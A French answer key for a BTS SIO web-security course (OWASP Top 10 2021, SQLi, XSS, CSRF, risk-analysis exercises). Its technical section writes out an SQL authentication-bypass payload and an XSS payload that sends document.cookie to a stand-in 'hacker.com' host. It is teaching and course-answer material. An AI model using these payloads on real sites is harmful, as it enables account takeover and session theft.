---
title: "Correction : Sécurité Web & OWASP"
chapter: "BTS SIO 1 : B3 - CyberSécurité"
icon: "🛡️"
---

# Correction : Sécurité des Applications Web (OWASP)

> **Avertissement** : Ce document contient les réponses aux questions de compréhension et aux exercices techniques du cours.

## 1. OWASP Top 10 (2021) - Réponses

### A01:2021 - Broken Access Control
1.  **Nom de la vulnérabilité :** IDOR (Insecure Direct Object Reference).
2.  **Protection Admin :** Vérifier les rôles côté serveur (ex: `@PreAuthorize("hasRole('ADMIN')")` ou `if (!user.isAdmin()) die()`).
3.  **Pourquoi `display: none` est insuffisant ?** Car l'attaquant peut inspecter le code source (F12) pour trouver l'URL cachée ou faire une requête directe (curl/Postman) sans passer par l'interface.

### A02:2021 - Cryptographic Failures
1.  **MD5 obsolète :** Il est trop rapide à calculer (permettant le brute-force) et sujet aux collisions (deux fichiers différents peuvent avoir le même hash).
2.  **Chiffrement vs Hachage :** Le chiffrement est réversible (avec une clé), le hachage est irréversible (on ne peut pas retrouver le mot de passe original).
3.  **Salt (Sel) :** Une chaîne aléatoire ajoutée au mot de passe avant le hachage. Il empêche les attaques par "Rainbow Tables" (tables pré-calculées) car deux mots de passe identiques auront des hashs différents.

### A03:2021 - Injection
1.  **Rôle des guillemets :** Le premier guillemet ferme la chaîne de caractères en cours dans le code SQL, permettant ensuite d'écrire des commandes SQL (comme `OR`).
2.  **Autres interpréteurs :** Commandes OS (Shell Injection), LDAP, NoSQL (MongoDB), XML (XXE).
3.  **Validation client inutile :** L'attaquant peut désactiver le Javascript, modifier la requête avec un Proxy (Burp Suite) ou envoyer une requête directement via curl. La sécurité doit toujours être côté serveur.

### A04:2021 - Insecure Design
1.  **Bug vs Conception :** Un bug est une erreur dans le code (réparable par un patch). Une faille de conception est une erreur dans la logique ou l'architecture (nécessite de refaire le système).
2.  **Exemple dangereux :** Les "Questions Secrètes" (Nom de jeune fille de la mère, premier animal...) car ces informations sont souvent publiques sur les réseaux sociaux (OSINT).
3.  **Rate Limiting :** Limiter le nombre de requêtes par minute. Atténue les attaques par Force Brute, le Credential Stuffing et le Déni de Service (DoS).

### A05:2021 - Security Misconfiguration
1.  **Danger Stack Trace :** Elle révèle des informations techniques (chemins de fichiers, versions de logiciels, structure de la BDD) utiles pour préparer une attaque ciblée.
2.  **Risque comptes par défaut :** Les listes de mots de passe par défaut (ex: `admin/password`, `root/toor`) sont connues de tous les attaquants et testées automatiquement par les bots.
3.  **Outil de scan :** Nmap, Nessus, OpenVAS.

### A06:2021 - Vulnerable Components
1.  **CVE :** Common Vulnerabilities and Exposures. C'est un identifiant unique (ex: CVE-2021-44228) attribué à une faille de sécurité publique.
2.  **jQuery 2015 :** OUI, très probablement. Les vieilles versions contiennent souvent des failles XSS connues.
3.  **Outils d'analyse :** `npm audit`, `OWASP Dependency Check`, `Snyk`, `Dependabot`.

### A07:2021 - Identification Failures
1.  **Credential Stuffing :** L'attaquant utilise des couples email/mot de passe volés lors d'une brèche (ex: LinkedIn) pour tenter de se connecter sur d'autres sites (ex: Amazon, Netflix) où l'utilisateur aurait réutilisé le même mot de passe.
2.  **Limitation tentatives :** Pour empêcher les attaques par Force Brute (tester toutes les combinaisons possibles).
3.  **Sécurité supplémentaire :** MFA (Multi-Factor Authentication) ou 2FA (SMS, App Authenticator, Clé FIDO).

### A08:2021 - Integrity Failures
1.  **Signature numérique :** Elle garantit que le logiciel provient bien de l'éditeur officiel et n'a pas été modifié (injecté de virus) pendant le téléchargement.
2.  **Cible Supply Chain :** L'attaquant cible le fournisseur de logiciel (ex: SolarWinds) ou le dépôt de code, pour infecter tous les clients qui feront la mise à jour légitime.
3.  **Désérialisation :** Reconvertir une donnée (JSON, XML, binaire) en objet utilisable par le code. Si la donnée est malveillante, elle peut instancier des objets dangereux et exécuter du code.

### A09:2021 - Logging Failures
1.  **4 éléments clés :** Qui (User ID), Quoi (Action), Quand (Timestamp), Où (IP Source).
2.  **Logs externes :** Pour empêcher l'attaquant d'effacer ses traces s'il prend le contrôle du serveur (Root).
3.  **Risque non-détection :** La persistance. L'attaquant peut exfiltrer des données pendant des mois, installer des backdoors, et pivoter vers d'autres systèmes critiques.

### A10:2021 - SSRF
1.  **Qui fait la requête ?** Le serveur web (victime), pas le navigateur du client.
2.  **Cible interne :** Métadonnées Cloud (AWS/Azure/GCP) pour voler des clés API, Bases de données internes (Redis, MongoDB), Interfaces d'admin internes (localhost:8080).
3.  **Protection Allowlist :** N'autoriser que les domaines strictement nécessaires (ex: `*.partenaire-de-confiance.com`) et bloquer tout le reste, y compris les IP privées (127.0.0.1, 192.168.x.x, 10.x.x.x).

---

## 2. Focus Technique (E5) - Réponses

### A. Injection SQL (SQLi)
1.  **Payload Auth Bypass :** `' OR 1=1 --` (ou `admin' #`).
2.  **htmlspecialchars() inefficace ?** Cette fonction protège contre le HTML/JS (XSS), pas contre le SQL. Elle transforme `<` en `&lt;`, mais laisse passer `'` (sauf avec le flag ENT_QUOTES) et ne change rien à la syntaxe SQL (`UNION`, `SELECT`...).
3.  **Contrainte UNION :** Les deux requêtes doivent avoir **le même nombre de colonnes** et des types de données compatibles.

### B. Cross-Site Scripting (XSS)
1.  **Fonction PHP :** `htmlspecialchars($variable, ENT_QUOTES, 'UTF-8')`.
2.  **Script Cookie :** `<script>alert(document.cookie)</script>` ou `<img src=x onerror=fetch('http://hacker.com?c='+document.cookie)>`.
3.  **Stored vs Reflected :**
    *   **Reflected :** L'attaque est temporaire, le lien piégé doit être envoyé à la victime.
    *   **Stored :** L'attaque est permanente, stockée sur le serveur (BDD), et touche toutes les victimes qui visitent la page infectée sans action de l'attaquant.

### C. Cross-Site Request Forgery (CSRF)
1.  **Condition préalable :** L'utilisateur doit être **déjà connecté** (authentifié) sur le site cible dans son navigateur.
2.  **Danger du GET :** Les requêtes `GET` peuvent être déclenchées par une simple balise `<img>` ou un lien, ce qui est trivial à cacher. Les actions sensibles doivent toujours utiliser `POST` (plus difficile à forger sans Javascript).
3.  **Fonctionnement du Token :** Le serveur attend un code secret unique (le token) pour valider l'action. Le site de l'attaquant ne peut pas lire ce token (grâce à la Same-Origin Policy du navigateur), donc il ne peut pas envoyer une requête valide au nom de l'utilisateur.

---

## 3. Analyse Risques (E6) - Réponses

### Exercice TD 1 : Rédaction d'une alerte (Correction Type)

**Objet :** [CRITIQUE] Faille de sécurité détectée - Module Commentaires

**Corps du message :**

Bonjour,

Lors d'un audit de sécurité sur le site e-commerce, j'ai identifié une vulnérabilité critique de type **Cross-Site Scripting (XSS Stored)** dans le module de commentaires.

**Description :**
Il est possible pour un utilisateur malveillant d'insérer du code JavaScript dans un commentaire. Ce code est ensuite exécuté automatiquement par le navigateur de toute personne (client ou administrateur) consultant la page du produit.

**Impact :**
*   Vol de session administrateur (prise de contrôle du site).
*   Redirection des clients vers des sites de phishing.
*   Modification du contenu de la page (défiguration).

**Recommandations :**
1.  **Immédiat :** Désactiver temporairement l'affichage des commentaires.
2.  **Court terme :** Purger la base de données des commentaires contenant des balises `<script>`.
3.  **Correctif :** Appliquer la fonction `htmlspecialchars()` lors de l'affichage des commentaires dans le code PHP.

Je reste à votre disposition pour appliquer le correctif.

Cordialement,
[Votre Nom] - Technicien SISR

### Exercice TD 2 : Analyse de Contexte (Boulangerie)

**Évaluation : FAIBLE à MOYENNE** (Pas Critique).

**Justification (Critères DIC) :**
*   **Confidentialité (Faible) :** Il n'y a pas de données sensibles (pas de clients, pas de mots de passe, pas de CB). Au pire, l'attaquant vole la liste des pains.
*   **Intégrité (Moyenne) :** L'attaquant peut modifier les horaires (nuisance) ou faire du "Defacement" (afficher des messages politiques). Cela nuit à l'image mais ne bloque pas la vente (qui est physique).
*   **Disponibilité (Faible/Moyenne) :** Si le site est supprimé, les clients peuvent toujours venir acheter du pain. L'impact financier est minime.

*Note : Si le site permettait la commande en ligne ("Click & Collect"), la gravité passerait à ÉLEVÉE/CRITIQUE.*

### Exercice TD 3 : Analyse de Logs

1.  **Attaque SQL Injection (SQLi)** : Présence de `'--` dans le paramètre user. Code 200 (Réussite potentielle).
2.  **Attaque XSS Reflected** : Présence de `<script>` dans le paramètre q. Code 200 (Faille probable).
3.  **Tentative d'accès (Broken Access Control)** : Tentative d'accès à un fichier de config sensible. Code 403 (Forbidden) -> L'attaque a échoué (bonne configuration).
4.  **Upload de fichier malveillant (RCE)** : Envoi d'un fichier `shell.php`. Si le serveur l'exécute, l'attaquant prend le contrôle total.

### Exercice TD 4 : Politique de Mots de Passe

**Faiblesses Identifiées :**
1.  **Longueur trop courte :** 6 caractères est cassable instantanément par force brute moderne.
2.  **Pas de verrouillage :** Permet les attaques par force brute illimitées en ligne.
3.  **Renouvellement forcé fréquent :** Contre-productif (recommandation ANSSI/NIST). Les utilisateurs vont choisir des mots de passe faibles ("P@ss1", "P@ss2") ou les noter sur un post-it.

**Politique Corrigée (ANSSI) :**
*   **Longueur :** 12 caractères minimum (ou 8 avec complexité forte).
*   **Complexité :** 3 types de caractères (Maj, Min, Chiffres, Spéciaux).
*   **Renouvellement :** Uniquement en cas de suspicion de compromission (pas de changement forcé arbitraire).
*   **Verrouillage :** Blocage du compte pendant 15 minutes après 5 échecs consécutifs.
